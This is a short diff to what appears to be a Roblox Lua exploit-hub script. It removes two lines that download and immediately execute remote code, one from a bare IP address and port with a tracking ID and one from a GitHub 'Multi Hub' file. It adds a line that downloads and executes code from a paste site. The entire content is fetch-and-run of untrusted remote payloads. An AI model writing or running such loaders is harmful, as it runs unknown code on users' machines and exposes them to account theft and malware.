@@ -1,3 +1,1 @@
-ID="c695513a-04b4-44a9-9b57-d61ca0588e2d";
-loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Script-Working/loadscreen/refs/heads/main/Multi%20Hub"))()
+loadstring(game:HttpGet("https://pastefy.app/xCqGlsww/raw"))()
